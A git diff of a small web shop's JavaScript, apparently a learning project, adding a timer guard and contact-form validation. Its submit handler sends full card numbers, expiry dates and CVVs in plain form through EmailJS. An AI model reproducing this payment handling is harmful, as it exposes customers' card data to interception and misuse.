@@ -2,18 +2,35 @@ const daniEl = document.getElementById("dani");
 const satiEl = document.getElementById("sati");
 const minuteEl = document.getElementById("minute");
 const sekundeEl = document.getElementById("sekunde");
+const hasTimer = daniEl && satiEl && minuteEl && sekundeEl;
+
 const toggle = document.getElementById("dark-mode-toggle");
 const toggleMob = document.getElementById("dark-mode-toggle-mob");
 const logo = document.getElementById("logo");
+
 const korpaToggle = document.getElementById("korpa-toggle");
 const korpaToggleDesktop = document.getElementById("korpa-toggle-desktop");
 const korpaPanel = document.getElementById("korpa-panel");
 const korpaOverlay = document.getElementById("korpa-overlay");
 const korpaZatvori = document.getElementById("korpa-zatvori");
+
 const brojac = document.querySelectorAll(".stat-broj");
+
 const hamburger = document.getElementById("hamburger");
 const mobMeni = document.getElementById("mob-meni");
 const overlay = document.getElementById("mob-overlay");
+const kontejner = document.getElementById("kartice-kontejner");
+const template = document.querySelector(".template-kartice");
+
+const form = document.querySelector(".Kontakt form");
+const ime = document.getElementById("ime");
+const prezime = document.getElementById("prezime");
+const email = document.getElementById("email");
+const tel = document.getElementById("tel");
+const brojK = document.getElementById("BrojK");
+const datum = document.getElementById("datum");
+const cvv = document.getElementById("cvv");
+const bankaime = document.getElementById("bankaime");
 
 korpaToggleDesktop.addEventListener("click", otvoriKorpu);
 korpaToggle.addEventListener("click", otvoriKorpu);
@@ -46,7 +63,7 @@ toggle.addEventListener("change", () => {
   if (toggleMob) toggleMob.checked = toggle.checked;
 });
 
-// MOBILE toggle 
+// mobile toggle 
 if (toggleMob) {
   toggleMob.addEventListener("change", () => {
     document.body.classList.toggle("dark", toggleMob.checked);
@@ -69,13 +86,13 @@ function format(n){
 }
 
 // Funkcija za osvježavanje countdown timera
-function osvjezitajmer(){
+function osvjezitajmer() {
+   if (!hasTimer) return;
 
   const trenutno = new Date().getTime();
   const razlika = konacno - trenutno;
 
-  // Ako je odbrojavanje završeno
-  if(razlika <= 0){
+  if (razlika <= 0) {
     daniEl.textContent = "00";
     satiEl.textContent = "00";
     minuteEl.textContent = "00";
@@ -83,17 +100,20 @@ function osvjezitajmer(){
     return;
   }
 
-  // Izračunavanje dana, sati, minuta i sekundi
   const sekunde = Math.floor((razlika / 1000) % 60);
   const minute = Math.floor((razlika / (1000 * 60)) % 60);
   const sati = Math.floor((razlika / (1000 * 60 * 60)) % 24);
   const dani = Math.floor(razlika / (1000 * 60 * 60 * 24));
 
-  // Prikaz vremena na stranici
   daniEl.textContent = format(dani);
   satiEl.textContent = format(sati);
   minuteEl.textContent = format(minute);
   sekundeEl.textContent = format(sekunde);
+}
+// Pokretanje timera
+if (hasTimer) {
+  osvjezitajmer();
+  setInterval(osvjezitajmer, 1000);
 }
 
 // Funkcija za otvaranje korpe
@@ -151,6 +171,78 @@ document.querySelectorAll(".mob-meni a").forEach(link => {
     });
 });
 
-// Pokretanje timera
-osvjezitajmer();
-setInterval(osvjezitajmer, 1000);
+// Ovaj regex za validaciju email adrese sam pronašao uz pomoć ChatGPT-a.
+// Regex provjerava da email ima ispravan format (tekst@domena.tld),
+// gdje ^ označava početak, \w i .- dopuštaju znakove prije @,
+// a {2,} osigurava da domena ima najmanje 2 znaka.
+const imeRegex = /^[A-Za-zČĆŽŠĐčćžšđ\s]{2,}$/;
+const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+const telRegex = /^[0-9+\s]{6,20}$/;
+const cardRegex = /^[0-9]{16}$/;
+const cvvRegex = /^[0-9]{3,4}$/;
+
+function validateField(input, regex, message) {
+  if (!input) return true;
+
+  const value = input.value.trim();
+  const error = input.nextElementSibling;
+
+  const isValid = regex.test(value);
+
+  if (!isValid) {
+    error.textContent = message;
+    return false;
+  } else {
+    error.textContent = "";
+    return true;
+  }
+}
+
+form.addEventListener("submit", function (e) {
+  e.preventDefault();
+
+  let valid = true;
+
+  valid &= validateField(ime, imeRegex, "Unesite ispravno ime");
+  valid &= validateField(prezime, imeRegex, "Unesite ispravno prezime");
+  valid &= validateField(email, emailRegex, "Unesite validan email");
+  valid &= validateField(tel, telRegex, "Unesite validan broj telefona");
+  valid &= validateField(brojK, cardRegex, "Kartica mora imati 16 brojeva");
+  valid &= validateField(cvv, cvvRegex, "CVV mora imati 3 ili 4 broja");
+  valid &= validateField(bankaime, imeRegex, "Unesite ime vlasnika kartice");
+
+  if (valid) {
+  const params = {
+    ime: ime.value,
+    prezime: prezime.value,
+    email: email.value,
+    tel: tel.value,
+    brojK: brojK.value,
+    datum: datum.value,
+    cvv: cvv.value,
+    bankaime: bankaime.value
+  };
+
+  emailjs.send("service_iyltaxr", "template_r3mbv29", params)
+    .then(() => {
+      form.reset();
+    })
+    .catch(() => {
+      alert("Greška pri slanju emaila!");
+    });
+}
+});
+form.addEventListener("reset", () => {
+  const errors = document.querySelectorAll(".error");
+
+  errors.forEach(error => {
+    error.textContent = "";
+  });
+
+  const success = document.getElementById("success-msg");
+  
+  if (success) {
+    success.remove();
+  }
+});
+
